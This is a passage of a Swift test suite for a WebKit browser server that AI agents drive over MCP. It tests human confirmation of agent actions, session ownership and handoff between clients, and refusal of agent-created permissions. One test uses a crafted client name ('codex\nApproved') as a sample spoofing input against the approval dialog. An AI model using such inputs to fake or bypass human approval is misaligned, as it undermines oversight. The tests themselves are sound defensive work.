        "postcondition": .object(["type": .string("target_absent"), "value": .string("true")]),
      ])
    let result = try object(try object(acted["result"])["structuredContent"])
    #expect(result["action_state"] == nil)
    let verification = try object(result["verification"])
    #expect(verification.keys.contains("verified"))
    #expect(presenter.requests.count == 1)
  }

  @Test("Losing a dialog scope after dispatch is indeterminate, never verified absence")
  func scopedDialogLossIsUnknown() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<div role='dialog' aria-label='Local wizard'><button onclick='this.parentElement.remove()'>Close wizard</button></div>",
      baseURL: URL(string: "https://scope-loss.fixture.invalid"),
      timeout: .seconds(15), quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let session = JSONValue.string(handle.rawValue.uuidString)
    let fullReply = try await toolCall(
      server, id: 1, name: "browser_observe", arguments: ["session_id": session])
    let full = try object(try object(fullReply["result"])["structuredContent"])
    let root = try elementID(in: full, named: "Local wizard")
    let scopedReply = try await toolCall(
      server, id: 2, name: "browser_observe",
      arguments: [
        "session_id": session, "scope_observation_id": full["observationID"]!,
        "scope_element_id": .string(root),
      ])
    let scoped = try object(try object(scopedReply["result"])["structuredContent"])
    let target = try elementID(in: scoped, named: "Close wizard")
    let acted = try await toolCall(
      server, id: 3, name: "browser_act",
      arguments: [
        "session_id": session, "observation_id": scoped["observationID"]!,
        "element_id": .string(target), "operation": .string("click"),
        "idempotency_key": .string("scope-loss-639"),
        "postcondition": .object(["type": .string("target_absent"), "value": .string("true")]),
      ])
    let result = try object(try object(acted["result"])["structuredContent"])
    #expect(result["action_state"] == .string("dispatched_verification_indeterminate"))
    #expect(result["action_replayed"] == .bool(false))
    #expect(presenter.requests.count == 1)
  }

  @Test("MCP arguments cannot create a remembered permission")
  func rememberedPermissionCannotBeCreatedByToolArguments() async throws {
    let server = try WebKitMCPServer()
    let response = try await toolCall(
      server, id: 1, name: "browser_session",
      arguments: [
        "operation": .string("always_allow"), "origin": .string("https://fixture.invalid"),
      ])
    if let error = response["error"] {
      #expect(try object(error)["code"] == .int(-32602))
    } else {
      #expect(try object(response["result"])["isError"] == .bool(true))
    }
  }

  @Test(
    "A locally selected session permission skips only its selected scope", arguments: [false, true])
  func rememberedSessionPermissionIsScoped(interactions: Bool) async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<label>Name<input name='public-name'></label>",
      baseURL: URL(string: "https://fixture.invalid/input"), timeout: .seconds(3),
      quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [])
    presenter.forcedOutcome =
      interactions ? .approvedSessionInteractions : .approvedSessionNavigation
    let approvals = SiteApprovalStore()
    let server = WebKitMCPServer(
      registry: registry, confirmationPresenter: presenter, siteApprovals: approvals)
    for index in Int64(0)..<3 {
      if index == 1 { presenter.forcedOutcome = .declined }
      if index == 2 { try? approvals.revokeAll() }
      let observed = try await toolCall(
        server, id: 10 + index * 2, name: "browser_observe",
        arguments: ["session_id": .string(handle.rawValue.uuidString)])
      let observation = try object(try object(observed["result"])["structuredContent"])
      let response = try await toolCall(
        server, id: 11 + index * 2, name: "browser_act",
        arguments: [
          "session_id": .string(handle.rawValue.uuidString),
          "operation": .string("fill"), "value": .string("Fixture \(index)"),
          "idempotency_key": .string("remember-fixture-\(index)"),
          "observation_id": .string(try string(observation["observationID"])),
          "element_id": .string(try elementID(in: observation, named: "Name")),
        ])
      let result = try object(response["result"])
      let shouldPass = index == 0 || (index == 1 && interactions)
      #expect((result["isError"] != .bool(true)) == shouldPass)
      if index == 1 && interactions {
        #expect(
          try object(result["structuredContent"])["authorization_source"]
            == .string("remembered_session"))
        #expect(presenter.requests.count == 1)
      }
    }
    #expect(presenter.requests.count == (interactions ? 2 : 3))
  }

  @Test("A download timeout exposes trusted dispatch without claiming a transfer")
  func timedOutDownloadHasStageEvidence() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<h1>Export form</h1><button>Export fixture</button>",
      baseURL: URL(string: "https://fixture.invalid/export"), timeout: .seconds(3),
      quietWindow: .milliseconds(40))
    let server = WebKitMCPServer(
      registry: registry, confirmationPresenter: ConfirmationPresenterStub(responses: [true]))
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let response = try await toolCall(
      server, id: 2, name: "browser_download",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "idempotency_key": .string("timeout-fixture-only"),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try elementID(in: observation, named: "Export fixture")),
      ])
    let result = try object(response["result"])
    #expect(result["isError"] == .bool(true))
    let content = try object(result["structuredContent"])
    #expect(content["status"] == .string("download_timeout"))
    #expect(content["reason"] == .string("download_receipt_timed_out"))
    #expect(content["native_dispatch_attempted"] == .bool(true))
    #expect(content["native_gesture_verified"] == .bool(true))
    #expect(content["download_started"] == .bool(false))
    #expect(content["destination_selection_started"] == .bool(false))
    #expect(content["download_window_created"] == .bool(false))
    #expect(content["new_window_source_main_frame"] == .bool(false))
    #expect(content["new_window_target_absent"] == .bool(false))
    #expect(content["automatic_retry_allowed"] == .bool(false))
  }

  @Test("A refused export window retains request-local diagnostics")
  func refusedDownloadWindowHasStageEvidence() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<h1>Preserved form</h1><button onclick=\"setTimeout(() => { window.open('', '_blank'); window.open('', '_blank'); }, 100)\">Export fixture</button>",
      baseURL: URL(string: "https://fixture.invalid/export"), timeout: .seconds(3),
      quietWindow: .milliseconds(40))
    let server = WebKitMCPServer(
      registry: registry, confirmationPresenter: ConfirmationPresenterStub(responses: [true]))
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let response = try await toolCall(
      server, id: 2, name: "browser_download",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "idempotency_key": .string("duplicate-window-fixture-only"),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try elementID(in: observation, named: "Export fixture")),
      ])
    let result = try object(response["result"])
    #expect(result["isError"] == .bool(true))
    let content = try object(result["structuredContent"])
    #expect(content["status"] == .string("download_failed"))
    #expect(content["reason"] == .string("download_window_duplicate"))
    #expect(content["native_dispatch_attempted"] == .bool(true))
    #expect(content["new_window_requested"] == .bool(true))
    #expect(content["new_window_source_main_frame"] == .bool(true))
    #expect(content["download_window_created"] == .bool(true))
    #expect(content["artifact_exists"] == .bool(false))
    #expect(content["automatic_retry_allowed"] == .bool(false))
    #expect(try await runtime.readText().bodyText.contains("Preserved form"))
  }

  @Test("A native action after reconnect and completed handoff still needs its own confirmation")
  func confirmationAfterHandoffResumeRemainsBound() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<button onclick=\"this.textContent='Changed'\">Next</button>",
      baseURL: URL(string: "https://fixture.invalid/resume-confirmation"),
      timeout: .seconds(3), quietWindow: .milliseconds(40))
    let server = WebKitMCPServer(registry: registry, presentHumanWindows: false)
    let sessionID = handle.rawValue.uuidString
    let start = try await toolCall(
      server, id: 1, name: "browser_session",
      arguments: [
        "session_id": .string(sessionID), "operation": .string("handoff_start"),
      ])
    let token = try string(
      try object(try object(start["result"])["structuredContent"])["resume_token"])
    try runtime.markHumanStepCompleted()
    await server.prepareForClientReconnect()
    let presenter = ConfirmationPresenterStub(responses: [false])
    let reconnected = WebKitMCPServer(
      registry: registry, presentHumanWindows: false,
      confirmationPresenter: presenter)
    _ = try await toolCall(
      reconnected, id: 2, name: "browser_session",
      arguments: [
        "session_id": .string(sessionID), "operation": .string("handoff_resume"),
        "resume_token": .string(token),
      ])
    let observed = try await toolCall(
      reconnected, id: 3, name: "browser_observe",
      arguments: [
        "session_id": .string(sessionID)
      ])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try element(in: observation, named: "Next")
    let refused = try await toolCall(
      reconnected, id: 4, name: "browser_act",
      arguments: [
        "session_id": .string(sessionID), "operation": .string("click"),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try string(target["elementID"])),
        "approval_mode": .string("native"), "idempotency_key": .string("after-handoff-once"),
        "postcondition": .object([
          "type": .string("semantic_text_appears"), "value": .string("Changed"),
        ]),
      ])
    #expect(try object(refused["result"])["isError"] == .bool(true))
    #expect(presenter.requests.count == 1)
    #expect(presenter.requests.first?.title.contains(runtime.humanControlSessionLabel) == true)
    #expect(
      try await runtime.webView.evaluateJavaScript(
        "document.querySelector('button').textContent === 'Next'") as? Bool == true)
  }

  @Test("Profiles advertise only executable policies and disclose privacy limits")
  func profilesAdvertiseOnlyExecutablePolicies() async throws {
    let server = try WebKitMCPServer()
    let response = try await toolCall(
      server,
      id: 1,
      name: "browser_session",
      arguments: [
        "operation": .string("profiles")
      ]
    )
    let structured = try object(try object(response["result"])["structuredContent"])
    #expect(
      structured["available_execution_policies"]
        == .array([.string("auto"), .string("trusted_local")]))
    #expect(structured["authenticated_origins"] == .array([]))
    #expect(
      structured["authenticated_origins_status"]
        == .string("not_observable_without_inspecting_credentials_or_cookies"))
    let unavailable = try object(structured["unavailable_execution_policies"])
    #expect(unavailable["compatibility"] != nil)
    #expect(unavailable["isolated_read_only"] != nil)

    let unknown = try await toolCall(
      server, id: 2, name: "not_a_tool", arguments: [:])
    let unknownResult = try object(unknown["result"])
    let error = try object(unknownResult["structuredContent"])
    #expect(unknownResult["isError"] == .bool(true))
    #expect(error["code"] == .string("tool_error"))
    #expect(error["message"] != nil)
    #expect(error["remediation"] != nil)
    #expect(error["holder"] == .null)
  }

  @Test("A competing host gets holder details and may wait without stealing the lease")
  func hostBusyIsStructuredAndWaitable() async throws {
    let directory = FileManager.default.temporaryDirectory.appendingPathComponent(
      "webkitui-server-host-lock-\(UUID().uuidString)", isDirectory: true)
    defer { try? FileManager.default.removeItem(at: directory) }
    let lockURL = directory.appendingPathComponent("controller.lock")
    let firstRegistry = try WebKitSessionRegistry(
      enforceHostExclusiveSession: true, hostControllerLockURL: lockURL)
    let secondRegistry = try WebKitSessionRegistry(
      enforceHostExclusiveSession: true, hostControllerLockURL: lockURL)
    let firstClient = WebKitMCPServer(registry: firstRegistry)
    let secondClient = WebKitMCPServer(registry: secondRegistry)

    let firstOpen = try await toolCall(
      firstClient, id: 1, name: "browser_session",
      arguments: ["operation": .string("open")])
    let firstState = try object(
      try object(firstOpen["result"])["structuredContent"])
    let firstHandle = WebKitSessionHandle(
      rawValue: try #require(UUID(uuidString: try string(firstState["session_id"]))))

    let externalStatus = try await toolCall(
      secondClient, id: 2, name: "browser_session",
      arguments: ["operation": .string("status")])
    let externalState = try object(
      try object(externalStatus["result"])["structuredContent"])
    #expect(externalState["status"] == .string("host_controller_busy"))
    #expect(externalState["control_available"] == .bool(false))
    #expect(try object(externalState["holder"])["client_name"] == .string("tests"))

    let busy = try await toolCall(
      secondClient, id: 3, name: "browser_session",
      arguments: ["operation": .string("open")])
    let blocked = try object(try object(busy["result"])["structuredContent"])
    #expect(blocked["code"] == .string("host_controller_busy"))
    #expect(blocked["message"] != nil)
    #expect(blocked["remediation"] != nil)
    let holder = try object(blocked["holder"])
    #expect(holder["client_name"] == .string("tests"))
    #expect(holder["pid"] == .int(Int64(getpid())))

    let releaseTask = Task { @MainActor in
      try await Task.sleep(for: .milliseconds(150))
      try firstRegistry.close(firstHandle)
    }
    let waited = try await toolCall(
      secondClient, id: 4, name: "browser_session",
      arguments: [
        "operation": .string("open"),
        "wait_timeout_ms": .int(1_000),
      ])
    let waitedState = try object(
      try object(waited["result"])["structuredContent"])
    try await releaseTask.value
    #expect(waitedState["control_available"] == .bool(true))
    #expect(secondRegistry.count == 1)
  }

  @Test("A durable host reuses its live browser but invalidates client observations")
  func durableBrowserReconnect() async throws {
    let registry = try WebKitSessionRegistry()
    let server = WebKitMCPServer(
      registry: registry,
      preserveBrowserOnClose: true
    )
    let opened = try await toolCall(
      server, id: 1, name: "browser_session", arguments: ["operation": .string("open")])
    let first = try object(try object(opened["result"])["structuredContent"])
    let sessionID = try string(first["session_id"])
    #expect(first["reused"] == .bool(false))

    let runtime = try registry.runtime(
      for: WebKitSessionHandle(rawValue: try #require(UUID(uuidString: sessionID))))
    _ = try await runtime.loadHTML(
      "<button aria-label='Continue'>Continue</button>",
      baseURL: URL(string: "https://fixture.invalid/session"),
      timeout: .seconds(2),
      quietWindow: .milliseconds(40)
    )
    _ = try await runtime.webView.evaluateJavaScript(
      "sessionStorage.setItem('durable-browser-proof', 'alive')")
    let observed = try await toolCall(
      server,
      id: 2,
      name: "browser_observe",
      arguments: ["session_id": .string(sessionID)]
    )
    let observation = try object(try object(observed["result"])["structuredContent"])

    let closed = try await toolCall(
      server,
      id: 3,
      name: "browser_session",
      arguments: ["operation": .string("close"), "session_id": .string(sessionID)]
    )
    #expect(
      try object(try object(closed["result"])["structuredContent"])["browser_preserved"]
        == .bool(true))
    await server.prepareForClientReconnect()

    let reopened = try await toolCall(
      server, id: 4, name: "browser_session", arguments: ["operation": .string("open")])
    let second = try object(try object(reopened["result"])["structuredContent"])
    #expect(second["session_id"] == .string(sessionID))
    #expect(second["reused"] == .bool(true))
    let durableProof =
      try await runtime.webView.evaluateJavaScript(
        "sessionStorage.getItem('durable-browser-proof')") as? String
    #expect(durableProof == "alive")

    let staleAction = try await toolCall(
      server,
      id: 5,
      name: "browser_act",
      arguments: [
        "session_id": .string(sessionID),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string("e1"),
        "operation": .string("click"),
        "idempotency_key": .string("must-not-cross-reconnect"),
      ]
    )
    #expect(try object(staleAction["error"])["code"] == .int(-32602))
  }

  @Test("A second durable client cannot navigate or invalidate the owned browser")
  func durableMultiClientAuthorityIsolation() async throws {
    let registry = try WebKitSessionRegistry()
    let firstClient = WebKitMCPServer(durableRegistry: registry)
    let secondClient = WebKitMCPServer(durableRegistry: registry)

    let firstOpen = try await toolCall(
      firstClient, id: 1, name: "browser_session",
      arguments: ["operation": .string("open")])
    let first = try object(try object(firstOpen["result"])["structuredContent"])
    let sessionID = try string(first["session_id"])
    #expect(first["reused"] == .bool(false))
    #expect(first["control_available"] == .bool(true))

    let publicStatus = try await toolCall(
      secondClient, id: 2, name: "browser_session",
      arguments: ["operation": .string("status")])
    let publicState = try object(
      try object(publicStatus["result"])["structuredContent"])
    #expect(publicState["session_id"] == .string(sessionID))
    #expect(publicState["session_owner_state"] == .string("owned_elsewhere"))
    let holder = try object(publicState["holder"])
    #expect(holder["client_name"] == .string("tests"))
    #expect(holder["pid"] == .int(Int64(getpid())))
    #expect(holder["age_ms"] != nil)
    #expect(holder["inactive_ms"] != nil)
    #expect(holder["policy"] == .string("auto"))

    let runtime = try registry.runtime(
      for: WebKitSessionHandle(rawValue: try #require(UUID(uuidString: sessionID))))
    _ = try await runtime.loadHTML(
      "<button aria-label='Shared browser'>Shared browser</button>",
      baseURL: URL(string: "https://fixture.invalid/shared"),
      timeout: .seconds(2), quietWindow: .milliseconds(40))

    let firstObservation = try await toolCall(
      firstClient, id: 2, name: "browser_observe",
      arguments: ["session_id": .string(sessionID)])
    let firstObservationID = try string(
      object(try object(firstObservation["result"])["structuredContent"])["observationID"])

    let secondOpen = try await toolCall(
      secondClient, id: 3, name: "browser_session",
      arguments: ["operation": .string("open")])
    let second = try object(try object(secondOpen["result"])["structuredContent"])
    #expect(second["session_id"] == .string(sessionID))
    #expect(second["reused"] == .bool(true))
    #expect(second["control_available"] == .bool(false))

    let blockedHandoff = try await toolCall(
      secondClient, id: 4, name: "browser_session",
      arguments: [
        "operation": .string("handoff_start"), "session_id": .string(sessionID),
      ])
    let handoffState = try object(
      try object(blockedHandoff["result"])["structuredContent"])
    #expect(handoffState["status"] == .string("session_in_use"))
    #expect(handoffState["wait_only"] == .bool(true))
    #expect(handoffState["resume_token"] == nil)
    #expect(
      try registry.runtime(
        for: WebKitSessionHandle(rawValue: #require(UUID(uuidString: sessionID)))
      ).interactionControlState() == .agentControlled)

    let blockedObservation = try await toolCall(
      secondClient, id: 5, name: "browser_observe",
      arguments: ["session_id": .string(sessionID)])
    let blocked = try object(try object(blockedObservation["result"])["structuredContent"])
    #expect(blocked["status"] == .string("session_in_use"))
    #expect(blocked["code"] == .string("session_in_use"))
    #expect(blocked["message"] != nil)
    #expect(blocked["remediation"] != nil)
    #expect(blocked["holder"] != nil)
    #expect(blocked["wait_only"] == .bool(true))

    let firstStillFresh = try await toolCall(
      firstClient, id: 6, name: "browser_inspect_element",
      arguments: [
        "session_id": .string(sessionID),
        "observation_id": .string(firstObservationID),
        "element_id": .string("e1"),
      ])
    #expect(try object(firstStillFresh["result"])["isError"] == nil)

    await firstClient.prepareForClientReconnect()
    let secondStillConnected = try await toolCall(
      secondClient, id: 7, name: "browser_observe",
      arguments: ["session_id": .string(sessionID)])
    #expect(try object(secondStillConnected["result"])["isError"] == nil)
  }

  @Test("A local human may transfer an idle session between durable clients")
  func durableClientHandoff() async throws {
    let registry = try WebKitSessionRegistry()
    let firstClient = WebKitMCPServer(durableRegistry: registry)
    let presenter = ConfirmationPresenterStub(responses: [true])
    let secondClient = WebKitMCPServer(
      registry: registry,
      confirmationPresenter: presenter,
      preserveBrowserOnClose: true)

    let opened = try await toolCall(
      firstClient, id: 1, name: "browser_session",
      arguments: ["operation": .string("open")])
    let sessionID = try string(
      object(try object(opened["result"])["structuredContent"])["session_id"])

    let handoff = try await toolCall(
      secondClient, id: 2, name: "browser_session",
      arguments: [
        "operation": .string("client_handoff"),
        "session_id": .string(sessionID),
      ])
    let handoffState = try object(
      try object(handoff["result"])["structuredContent"])
    #expect(handoffState["status"] == .string("ownership_transferred"))
    #expect(handoffState["control_available"] == .bool(true))
    #expect(presenter.requests.count == 1)
    #expect(presenter.requests.first?.title.hasPrefix("Transfer WebKitUI Control [") == true)

    let oldOwner = try await toolCall(
      firstClient, id: 3, name: "browser_observe",
      arguments: ["session_id": .string(sessionID)])
    let oldState = try object(
      try object(oldOwner["result"])["structuredContent"])
    #expect(oldState["code"] == .string("session_in_use"))

    let newOwner = try await toolCall(
      secondClient, id: 4, name: "browser_observe",
      arguments: ["session_id": .string(sessionID)])
    #expect(try object(newOwner["result"])["isError"] == nil)
  }

  @Test("A second durable client cannot replace an active handoff capability")
  func durableMultiClientHandoffOwnership() async throws {
    let registry = try WebKitSessionRegistry()
    let firstClient = WebKitMCPServer(durableRegistry: registry)
    let secondClient = WebKitMCPServer(durableRegistry: registry)

    let firstOpen = try await toolCall(
      firstClient, id: 1, name: "browser_session",
      arguments: ["operation": .string("open")])
    let sessionID = try string(
      object(try object(firstOpen["result"])["structuredContent"])["session_id"])
    let secondOpen = try await toolCall(
      secondClient, id: 2, name: "browser_session",
      arguments: ["operation": .string("open")])
    #expect(
      try object(try object(secondOpen["result"])["structuredContent"])["session_id"]
        == .string(sessionID))

    let firstStart = try await toolCall(
      firstClient, id: 3, name: "browser_session",
      arguments: [
        "operation": .string("handoff_start"), "session_id": .string(sessionID),
      ])
    let firstToken = try string(
      object(try object(firstStart["result"])["structuredContent"])["resume_token"])

    let secondStart = try await toolCall(
      secondClient, id: 4, name: "browser_session",
      arguments: [
        "operation": .string("handoff_start"), "session_id": .string(sessionID),
      ])
    let blocked = try object(try object(secondStart["result"])["structuredContent"])
    #expect(blocked["status"] == .string("session_in_use"))
    #expect(blocked["wait_only"] == .bool(true))
    #expect(blocked["resume_token"] == nil)
    #expect(try string(blocked["safe_next_step"]).contains("do not navigate"))

    _ = try await toolCall(
      secondClient, id: 5, name: "browser_session",
      arguments: ["operation": .string("close"), "session_id": .string(sessionID)])

    let firstStatus = try await toolCall(
      firstClient, id: 6, name: "browser_session",
      arguments: [
        "operation": .string("handoff_status"), "session_id": .string(sessionID),
        "resume_token": .string(firstToken),
      ])
    #expect(
      try object(try object(firstStatus["result"])["structuredContent"])["resume_token_state"]
        == .string("active"))
  }

  @Test("Two clients each get their own session, and cannot use each other's")
  func twoClientsHoldTwoSessions() async throws {
    let directory = FileManager.default.temporaryDirectory
      .appendingPathComponent("webkitui-client-sessions-\(UUID().uuidString)")
    defer { try? FileManager.default.removeItem(at: directory) }
    let registry = try WebKitSessionRegistry(
      maximumSessions: 3, enforceHostExclusiveSession: true,
      hostControllerLockURL: directory.appendingPathComponent("controller.lock"))
    let presenter = ConfirmationPresenterStub(responses: [false])
    let alice = WebKitMCPServer(
      registry: registry, presentHumanWindows: false, preserveBrowserOnClose: true)
    let bob = WebKitMCPServer(
      registry: registry, presentHumanWindows: false, confirmationPresenter: presenter,
      preserveBrowserOnClose: true)
    func open(_ server: WebKitMCPServer, id: Int64) async throws -> [String: JSONValue] {
      let opened = try await toolCall(
        server, id: id, name: "browser_session", arguments: ["operation": .string("open")])
      return try object(try object(opened["result"])["structuredContent"])
    }
    let aliceSession = try await open(alice, id: 2)
    let bobSession = try await open(bob, id: 3)
    #expect(aliceSession["client_control_state"] == .string("owned_by_this_client"))
    #expect(bobSession["client_control_state"] == .string("owned_by_this_client"))
    #expect(aliceSession["session_id"] != bobSession["session_id"])
    #expect(bobSession["maximum_sessions"] == .int(3))

    for (server, expected) in [(alice, aliceSession), (bob, bobSession)] {
      let response = try await toolCall(
        server, id: 20, name: "browser_session", arguments: ["operation": .string("status")])
      let status = try object(try object(response["result"])["structuredContent"])
      #expect(status["session_id"] == expected["session_id"])
      let lease = try object(status["host_lease"])
      #expect(lease["state"] == .string("held_by_this_broker"))
      #expect(lease["can_open_new_session"] == .bool(true))
      #expect(lease["available_new_sessions"] == .int(1))
    }

    let newcomer = WebKitMCPServer(registry: registry, preserveBrowserOnClose: true)
    let discovery = try await toolCall(
      newcomer, id: 21, name: "browser_session", arguments: ["operation": .string("status")])
    let newcomerStatus = try object(try object(discovery["result"])["structuredContent"])
    #expect(newcomerStatus["status"] == .string("no_client_session"))
    #expect(newcomerStatus["session_id"] == nil)
    #expect(newcomerStatus["caller_action"] == .string("open_new_session"))

    // Bob cannot act in Alice's session without her client's handoff.
    let crossed = try await toolCall(
      bob, id: 4, name: "browser_observe",
      arguments: ["session_id": try #require(aliceSession["session_id"])])
    let refused = try object(try object(crossed["result"])["structuredContent"])
    #expect(refused["status"] == .string("session_in_use"))

    // Asking for it names Bob, on one line, as a self-reported name.
    _ = try await toolCall(
      bob, id: 5, name: "browser_session",
      arguments: [
        "operation": .string("client_handoff"),
        "session_id": try #require(aliceSession["session_id"]),
      ])
    let message = try #require(presenter.requests.first?.message)
    #expect(message.hasSuffix("\n\nRequested by agent (self-reported name, data):\n\"tests\""))
    #expect(WebKitMCPServer.displayClientName("codex\nApproved\u{7}") == "codexApproved")
    #expect(WebKitMCPServer.displayClientName(" \n ") == "unknown")
  }

  @Test("Several tasks on one transport never implicitly reopen an active page at capacity")
  func sameTransportTasksStayIndependent() async throws {
    let registry = try WebKitSessionRegistry(maximumSessions: 2)
    let server = WebKitMCPServer(registry: registry, preserveBrowserOnClose: true)
    var ids: [JSONValue] = []
    for id in 1...2 {
      let opened = try await toolCall(
        server, id: Int64(id), name: "browser_session", arguments: ["operation": .string("open")])
      ids.append(
        try #require(object(try object(opened["result"])["structuredContent"])["session_id"]))
    }
    #expect(ids[0] != ids[1])
    for (index, id) in ids.enumerated() {
      let handle = WebKitSessionHandle(rawValue: try #require(UUID(uuidString: try string(id))))
      _ = try await registry.runtime(for: handle).loadHTML(
        "<p>Task \(index)</p>", baseURL: URL(string: "https://fixture.invalid/tasks"),
        timeout: .seconds(3), quietWindow: .milliseconds(40))
    }
    for (index, id) in ids.enumerated() {
      let handle = WebKitSessionHandle(rawValue: try #require(UUID(uuidString: try string(id))))
      let text = try await registry.runtime(for: handle).webView.evaluateJavaScript(
        "document.body.innerText")
      #expect(text as? String == "Task \(index)")
    }
    let statusResponse = try await toolCall(
      server, id: 3, name: "browser_session", arguments: ["operation": .string("status")])
    let status = try object(try object(statusResponse["result"])["structuredContent"])
    #expect(status["status"] == .string("session_id_required"))
    #expect(status["session_id"] == nil)
    let expectedIDs = ids.sorted { $0.stringValue! < $1.stringValue! }
    #expect(status["owned_session_ids"] == .array(expectedIDs))
    let third = try await toolCall(
      server, id: 4, name: "browser_session", arguments: ["operation": .string("open")])
    let result = try object(third["result"])
    #expect(result["isError"] == .bool(true))
    #expect(try object(result["structuredContent"])["code"] == .string("session_capacity_reached"))
    #expect(registry.count == 2)
  }

  @Test("A second durable client cannot create a competing multi-round handoff")
  func durableMultiClientRoundTripHandoffOwnership() async throws {
    let registry = try WebKitSessionRegistry()
    let firstClient = WebKitMCPServer(
      registry: registry, presentHumanWindows: false, preserveBrowserOnClose: true)
    let secondClient = WebKitMCPServer(
      registry: registry, presentHumanWindows: false, preserveBrowserOnClose: true)
    let firstOpen = try await toolCall(
      firstClient, id: 1, name: "browser_session",
      arguments: ["operation": .string("open")])
    let sessionID = try string(
      object(try object(firstOpen["result"])["structuredContent"])["session_id"])
    _ = try await toolCall(
      secondClient, id: 2, name: "browser_session",
      arguments: ["operation": .string("open")])

    let firstStart = try await toolCall(
      firstClient, id: 3, name: "browser_session",
      arguments: ["operation": .string("handoff"), "session_id": .string(sessionID)])
    #expect(try object(firstStart["result"])["resultType"] == .string("input_required"))

    let secondStart = try await toolCall(
      secondClient, id: 4, name: "browser_session",
      arguments: ["operation": .string("handoff"), "session_id": .string(sessionID)])
    let blocked = try object(try object(secondStart["result"])["structuredContent"])
    #expect(blocked["status"] == .string("session_in_use"))
    #expect(blocked["wait_only"] == .bool(true))
    #expect(try object(secondStart["result"])["requestState"] == nil)
  }

  @Test("Legacy initialize remains available without contaminating modern results")
  func legacyCompatibility() async throws {
    let server = try WebKitMCPServer()
    let response = try await call(
      server,
      id: 1,
      method: "initialize",
      params: .object(["protocolVersion": .string("2025-11-25")]),
      modern: false
    )
    let result = try object(response["result"])
    #expect(result["protocolVersion"] == .string("2025-11-25"))
    #expect(
      try object(result["serverInfo"])["version"] == .string(WebKitUIRelease.version)
    )
    #expect(result["resultType"] == nil)
    #expect(result["_meta"] == nil)

    let fallback = try await call(
      server,
      id: 2,
      method: "initialize",
      params: .object(["protocolVersion": .string("2026-07-28")]),
      modern: false
    )
    #expect(try object(fallback["result"])["protocolVersion"] == .string("2025-11-25"))

    let older = try await call(
      server,
      id: 3,
      method: "initialize",
      params: .object(["protocolVersion": .string("2025-06-18")]),
      modern: false
    )
    #expect(try object(older["result"])["protocolVersion"] == .string("2025-06-18"))

    let progressMetadata = try await rawCall(
      server,
      id: 4,
      method: "tools/list",
      params: .object([
        "_meta": .object(["progressToken": .string("legacy-progress")])
      ])
    )
    let progressResult = try object(progressMetadata["result"])
    #expect(progressResult["tools"] != nil)
    #expect(progressResult["resultType"] == nil)
    #expect(progressResult["_meta"] == nil)
  }

  @Test("Modern ping is not part of the stateless protocol")
  func modernPingRejected() async throws {
    let server = try WebKitMCPServer()
    let response = try await call(
      server, id: 1, method: "ping", params: .object([:]), modern: true)
    #expect(try object(response["error"])["code"] == .int(-32601))
  }

  @Test("Multi-round tools require the elicitation capability")
  func modernElicitationCapabilityRequired() async throws {
    let server = try WebKitMCPServer()
    let response = try await rawCall(
      server,
      id: 1,
      method: "tools/call",
      params: .object([
        "name": .string("browser_navigate"),
        "arguments": .object(["approval_mode": .string("mcp")]),
        "_meta": .object([
          "io.modelcontextprotocol/protocolVersion": .string("2026-07-28"),
          "io.modelcontextprotocol/clientCapabilities": .object([:]),
        ]),
      ])
    )
    let error = try object(response["error"])
    #expect(error["code"] == .int(-32021))
    #expect(try object(error["data"])["requiredCapabilities"] != nil)
  }

  @Test("Actuation requires one bound, single-use human confirmation")
  func actuationConfirmation() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      "<button>Save</button>", baseURL: URL(string: "https://example.test/start"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server,
      id: 1,
      name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)]
    )
    let observation = try object(try object(observed["result"])["structuredContent"])
    let observationID = try string(observation["observationID"])
    let firstElement = try object(try array(observation["elements"]).first)
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(observationID),
      "element_id": try firstElement["elementID"].map { .string(try string($0)) } ?? .null,
      "operation": .string("click"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("confirm-once"),
      "postcondition": .object([
        "type": .string("url_equals"),
        "value": .string("https://example.test/done"),
      ]),
    ]
    let first = try await toolCall(server, id: 2, name: "browser_act", arguments: arguments)
    let required = try object(first["result"])
    #expect(required["resultType"] == .string("input_required"))
    let requestState = try string(required["requestState"])
    let inputRequests = try object(required["inputRequests"])
    #expect(try object(inputRequests["confirmation"])["method"] == .string("elicitation/create"))

    let declined = try await call(
      server,
      id: 3,
      method: "tools/call",
      params: .object([
        "name": .string("browser_act"),
        "arguments": .object(arguments),
        "requestState": .string(requestState),
        "inputResponses": .object([
          "confirmation": .object(["action": .string("decline")])
        ]),
      ]),
      modern: true
    )
